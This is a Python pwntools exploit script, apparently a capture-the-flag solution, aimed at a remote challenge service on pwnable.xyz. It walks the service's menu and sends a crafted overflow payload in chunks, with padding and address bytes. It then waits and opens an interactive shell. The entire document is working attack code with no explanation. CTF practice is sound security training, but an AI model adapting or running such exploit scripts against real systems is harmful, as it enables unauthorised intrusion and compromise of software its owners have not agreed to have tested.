from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30022)

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def getsize(option='s'):
	if(option=='l'):
		init(2)
	else:
		init(1)
	print(target.recvuntil("me "))
	size=int(target.recvuntil(" ").strip(" "))
	print(target.recvuntil(": "))
	return size

def senddata(data):
	target.send(data)

def leak():
	init(3)
	print(target.recvuntil("msg "))
	leak=target.recvline().strip("\n")
	return leak

def save(size):
	init(4)
	print(target.recvuntil("? "))
	target.sendline(str(size))
	
data="\x2d\x0b\x40"+"A"*(0x400-3)+"\xa0\x20\x60"+"\x00"*0x20
count=0x403

size=getsize('l')
print(str(size))
senddata(data[0:size])
start=size
while(start<count):
	size=getsize()
	senddata(data[start:start+size])
	start+=size
save(3)
time.sleep(0x3d)
target.interactive()
